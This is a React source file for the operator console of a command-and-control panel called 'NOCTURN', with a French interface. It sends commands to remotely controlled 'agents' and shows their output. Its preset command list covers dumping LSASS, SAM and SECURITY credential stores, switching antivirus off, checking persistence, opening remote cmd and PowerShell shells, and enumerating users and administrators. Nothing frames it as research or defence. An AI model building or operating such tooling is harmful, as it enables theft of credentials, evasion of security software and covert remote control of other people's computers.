import { useState, useEffect, useRef, useCallback } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import api from '../lib/api'

interface HistoryEntry {
  command: string
  output: string
  cwd: string
  time: string
  isError?: boolean
  pending?: boolean
}

const COMMAND_CATEGORIES = [
  {
    label: '🖥 Système',
    cmds: ['whoami', 'hostname', 'systeminfo', 'net user', 'net localgroup administrators', 'check-admin'],
  },
  {
    label: '📁 Fichiers',
    cmds: ['dir', 'dir /a', 'tree', 'cd ..'],
  },
  {
    label: '🌐 Réseau',
    cmds: ['ipconfig /all', 'netstat -ano', 'arp -a', 'route print'],
  },
  {
    label: '⚙ Processus',
    cmds: ['tasklist', 'tasklist /v'],
  },
  {
    label: '🔐 Credentials',
    cmds: ['lsass', 'sam', 'system', 'security'],
  },
  {
    label: '🛡 Antivirus',
    cmds: ['av-status', 'av-off', 'av-on'],
  },
  {
    label: '📌 Persistance',
    cmds: ['check-persist'],
  },
  {
    label: '🐚 Shell',
    cmds: ['shell cmd.exe', 'shell powershell.exe', 'shell_close'],
  },
  {
    label: '❓ Aide',
    cmds: ['help', 'quit'],
  },
]

export default function Console() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const [history, setHistory] = useState<HistoryEntry[]>([])
  const [command, setCommand] = useState('')
  const [currentCwd, setCurrentCwd] = useState('?')
  const [loading, setLoading] = useState(false)
  const [cmdIndex, setCmdIndex] = useState(-1)
  const [showSidebar, setShowSidebar] = useState(true)
  const terminalRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const fetchHistory = useCallback(async () => {
    try {
      const res = await api.get(`/agents/${id}/history`)
      setHistory(res.data)
      if (res.data.length > 0) {
        setCurrentCwd(res.data[res.data.length - 1].cwd)
      }
    } catch {}
  }, [id])

  useEffect(() => { fetchHistory() }, [fetchHistory])

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [history])

  const sendCommand = async (cmd?: string) => {
    const toSend = (cmd || command).trim()
    if (!toSend || loading) return
    setLoading(true)
    setCommand('')
    setCmdIndex(-1)

    // Affiche la commande immédiatement dans le terminal (en attente)
    const pendingEntry: HistoryEntry = {
      command: toSend,
      output: '⏳ En attente de réponse...',
      cwd: currentCwd,
      time: new Date().toLocaleTimeString(),
      isError: false,
      pending: true,
    }
    setHistory(prev => [...prev, pendingEntry])

    try {
      const res = await api.post(`/agents/${id}/execute`, { command: toSend })
      const newCwd = res.data.cwd || currentCwd
      setCurrentCwd(newCwd)
      // Remplace l'entrée pending par la vraie réponse
      setHistory(prev => [
        ...prev.slice(0, -1),
        {
          command: toSend,
          output: res.data.output,
          cwd: newCwd,
          time: new Date().toLocaleTimeString(),
          isError: false,
          pending: false,
        }
      ])
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { error?: string } } }
      setHistory(prev => [
        ...prev.slice(0, -1),
        {
          command: toSend,
          output: axiosErr.response?.data?.error || 'Erreur de communication',
          cwd: currentCwd,
          time: new Date().toLocaleTimeString(),
          isError: true,
          pending: false,
        }
      ])
    } finally {
      setLoading(false)
      setTimeout(() => inputRef.current?.focus(), 50)
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      sendCommand()
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      const newIdx = Math.min(cmdIndex + 1, history.length - 1)
      setCmdIndex(newIdx)
      setCommand(history[history.length - 1 - newIdx]?.command || '')
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const newIdx = Math.max(cmdIndex - 1, -1)
      setCmdIndex(newIdx)
      setCommand(newIdx === -1 ? '' : history[history.length - 1 - newIdx]?.command || '')
    }
  }

  return (
    <div className="flex flex-col" style={{ height: '100vh', background: 'var(--bg-primary)' }}>
      {/* Header compact */}
      <header
        className="flex items-center justify-between px-4 py-2 border-b shrink-0"
        style={{ background: 'var(--bg-secondary)', borderColor: 'var(--border)', height: '44px' }}
      >
        <div className="flex items-center gap-3">
          <button
            onClick={() => navigate('/')}
            className="text-xs px-2 py-1 rounded"
            style={{ color: 'var(--text-muted)', background: 'var(--bg-card)' }}
          >
            ← Dashboard
          </button>
          <span className="text-sm font-bold tracking-widest" style={{ color: '#a78bfa' }}>NOCTURN</span>
          <span style={{ color: 'var(--text-muted)', fontSize: '10px' }}>/</span>
          <span className="font-mono text-sm font-bold" style={{ color: '#00ff41' }}>{id}</span>
        </div>

        <div className="flex items-center gap-2">
          <span
            className="font-mono text-xs px-2 py-1 rounded truncate max-w-xs"
            style={{ background: '#0d0d0d', color: '#a78bfa', border: '1px solid var(--border)' }}
          >
            {currentCwd}
          </span>
          {loading && (
            <span className="text-xs px-2 py-0.5 rounded animate-pulse"
              style={{ background: 'rgba(124,58,237,0.2)', color: '#a78bfa' }}>
              ⏳
            </span>
          )}
          <button
            onClick={() => setHistory([])}
            className="text-xs px-2 py-1 rounded"
            style={{ color: '#ef4444', background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.2)' }}
          >
            Clear
          </button>
          <button
            onClick={() => setShowSidebar(s => !s)}
            className="text-xs px-2 py-1 rounded"
            style={{ color: 'var(--text-muted)', background: 'var(--bg-card)', border: '1px solid var(--border)' }}
          >
            {showSidebar ? '▶ Cacher' : '◀ Commandes'}
          </button>
        </div>
      </header>

      {/* Body */}
      <div className="flex flex-1 overflow-hidden">

        {/* Sidebar gauche : historique */}
        <aside
          className="w-44 border-r shrink-0 overflow-y-auto"
          style={{ background: 'var(--bg-secondary)', borderColor: 'var(--border)' }}
        >
          <div className="px-3 py-2 text-xs font-semibold uppercase tracking-wider"
            style={{ color: 'var(--text-muted)', borderBottom: '1px solid var(--border)' }}>
            Historique
          </div>
          {history.slice().reverse().map((entry, i) => (
            <button
              key={i}
              onClick={() => !entry.pending && sendCommand(entry.command)}
              title={entry.command}
              className={`w-full text-left px-3 py-1.5 text-xs font-mono truncate ${entry.pending ? 'animate-pulse' : ''}`}
              style={{
                color: entry.isError ? '#f87171' : entry.pending ? '#f59e0b' : '#a78bfa',
                borderBottom: '1px solid rgba(30,30,46,0.5)',
              }}
            >
              {entry.pending ? '⏳ ' : ''}{entry.command}
            </button>
          ))}
        </aside>

        {/* Terminal central */}
        <div className="flex flex-col flex-1 overflow-hidden">
          {/* Output */}
          <div
            ref={terminalRef}
            className="flex-1 overflow-y-auto p-4 font-mono text-sm"
            style={{ background: 'var(--bg-terminal)' }}
            onClick={() => inputRef.current?.focus()}
          >
            {history.length === 0 && (
              <div className="terminal-glow opacity-40" style={{ color: '#00ff41' }}>
                NOCTURN C2 — Agent {id} connecté. En attente de commandes...
              </div>
            )}
            {history.map((entry, i) => (
              <div key={i} className="mb-3">
                <div className="flex items-baseline gap-2">
                  <span className="shrink-0" style={{ color: '#a78bfa' }}>{entry.cwd}&gt;</span>
                  <span className="terminal-glow" style={{ color: '#00ff41' }}>{entry.command}</span>
                  <span className="text-xs ml-auto shrink-0 opacity-30" style={{ color: '#64748b' }}>{entry.time}</span>
                </div>
                <pre
                  className={`mt-1 ml-4 text-xs whitespace-pre-wrap leading-relaxed ${entry.pending ? 'animate-pulse' : ''}`}
                  style={{ color: entry.isError ? '#f87171' : entry.pending ? '#6b7280' : '#e2e8f0' }}
                >
                  {entry.output}
                </pre>
              </div>
            ))}
            {loading && (
              <div className="flex items-center gap-2">
                <span style={{ color: '#a78bfa' }}>{currentCwd}&gt;</span>
                <span className="animate-pulse" style={{ color: '#00ff41' }}>█</span>
              </div>
            )}
          </div>

          {/* Input */}
          <div
            className="flex items-center px-4 py-2.5 border-t shrink-0"
            style={{ background: '#080808', borderColor: 'var(--border)', height: '44px' }}
          >
            <span className="font-mono text-sm mr-2 shrink-0" style={{ color: '#a78bfa' }}>
              {currentCwd}&gt;
            </span>
            <input
              ref={inputRef}
              type="text"
              value={command}
              onChange={e => setCommand(e.target.value)}
              onKeyDown={handleKeyDown}
              disabled={loading}
              placeholder={loading ? 'En attente...' : 'Commande...'}
              className="flex-1 bg-transparent outline-none font-mono text-sm terminal-glow"
              style={{ color: '#00ff41' }}
              autoFocus
            />
          </div>
        </div>

        {/* Sidebar droite : commandes par catégorie */}
        {showSidebar && (
          <aside
            className="w-52 border-l shrink-0 overflow-y-auto"
            style={{ background: 'var(--bg-secondary)', borderColor: 'var(--border)' }}
          >
            <div className="px-3 py-2 text-xs font-semibold uppercase tracking-wider"
              style={{ color: 'var(--text-muted)', borderBottom: '1px solid var(--border)' }}>
              Commandes
            </div>
            {COMMAND_CATEGORIES.map(cat => (
              <div key={cat.label} className="border-b" style={{ borderColor: 'rgba(30,30,46,0.5)' }}>
                <div className="px-3 py-1.5 text-xs font-semibold"
                  style={{ color: 'var(--text-muted)', background: 'rgba(124,58,237,0.05)' }}>
                  {cat.label}
                </div>
                {cat.cmds.map(cmd => (
                  <button
                    key={cmd}
                    onClick={() => sendCommand(cmd)}
                    className="w-full text-left px-3 py-1.5 text-xs font-mono transition-all hover:opacity-80"
                    style={{
                      color: '#a78bfa',
                      borderBottom: '1px solid rgba(30,30,46,0.3)',
                    }}
                    onMouseEnter={e => (e.currentTarget.style.background = 'rgba(124,58,237,0.1)')}
                    onMouseLeave={e => (e.currentTarget.style.background = 'transparent')}
                  >
                    {cmd}
                  </button>
                ))}
              </div>
            ))}
          </aside>
        )}
      </div>
    </div>
  )
}
